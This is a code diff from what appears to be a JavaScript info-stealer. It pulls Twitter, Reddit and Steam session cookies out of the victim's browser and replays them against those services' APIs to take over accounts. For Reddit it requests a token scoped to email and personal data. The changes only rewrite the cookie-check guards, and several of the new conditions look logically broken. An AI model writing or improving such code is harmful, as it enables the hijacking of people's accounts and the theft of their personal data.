@@ -7,7 +7,7 @@ const { getTempFolder } = require('../util/init');
 
 const twitter = async () => {
   const cookies = await getCookies();
-  if (!cookies || !cookies.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'ct0')) return;
+  if (!cookies && !cookies?.find(cookie => cookie.host?.includes('.twitter.com') && cookie.name === 'ct0')) return;
   const { value: ct0 } = cookies.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'ct0');
   const { value: authToken, source } = cookies.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'auth_token');
   const { data: profile } = await axios.post('https://twitter.com/i/api/1.1/account/update_profile.json', {}, {
@@ -39,7 +39,7 @@ const twitter = async () => {
 
 const reddit = async () => {
   const cookies = await getCookies();
-  if (!cookies || !cookies.find(cookie => cookie.host.includes('.reddit.com'))) return;
+  if (!cookies && !cookies?.find(cookie => cookie.host.includes('.reddit.com'))) return;
   const { value: cookie, source } = cookies.find(cookie => cookie.host.includes('.reddit.com') && cookie.name === 'reddit_session');
   const { data: bearer } = await axios.post('https://accounts.reddit.com/api/access_token', { scopes: ['*', 'email', 'pii'] }, {
     headers: { Cookie: `reddit_session=${cookie}`, Authorization: 'Basic b2hYcG9xclpZdWIxa2c6' }
@@ -68,7 +68,7 @@ const steam = async () => {
         accountId: account, accountInfo, games, level
       });
       const cookies = await getCookies();
-      if (!cookies || cookies.find(cookie => cookie.name === 'steamLoginSecure')) {
+      if (cookies && cookies?.find(cookie => cookie.name === 'steamLoginSecure')) {
         const cookie = cookies.find(cookie => cookie.host.includes('steam') && cookie.name === 'steamLoginSecure');
         if (cookie && cookie.value && account) {
           const userId = cookie.value.match(regex)[0];
